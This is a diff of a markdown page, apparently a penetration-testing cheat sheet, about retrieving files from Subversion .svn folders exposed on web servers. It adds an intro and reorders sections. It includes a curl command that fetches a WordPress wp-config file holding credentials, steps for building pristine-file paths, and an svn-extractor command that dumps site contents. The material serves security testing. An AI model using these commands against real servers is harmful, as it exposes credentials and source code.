@@ -1,14 +1,27 @@
 # Subversion
 
+> Subversion  (often abbreviated as SVN) is a centralized version control system (VCS) that has been widely used in the software development industry. Originally developed by CollabNet Inc. in 2000, Subversion was designed to be an improved version of CVS (Concurrent Versions System) and has since gained significant traction for its robustness and reliability. 
+
+
 ## Summary
 
-* [Examples](#examples)
 * [Tools](#tools)
     * [svn-extractor](#svn-extractor)
+* [Methodology](#methodology)
 * [References](#references)
 
 
-## Examples
+## Tools
+
+### svn-extractor
+
+* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - Simple script to extract all web resources by means of .SVN folder exposed over network. 
+    ```powershell
+    python svn-extractor.py --url "url with .svn available"
+    ```
+
+
+## Methodology
 
 ```powershell
 curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
@@ -24,15 +37,6 @@ curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
   * use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
   * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
-
-## Tools
-
-### svn-extractor
-
-* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - Simple script to extract all web resources by means of .SVN folder exposed over network. 
-    ```powershell
-    python svn-extractor.py --url "url with .svn available"
-    ```
 
 
 ## References
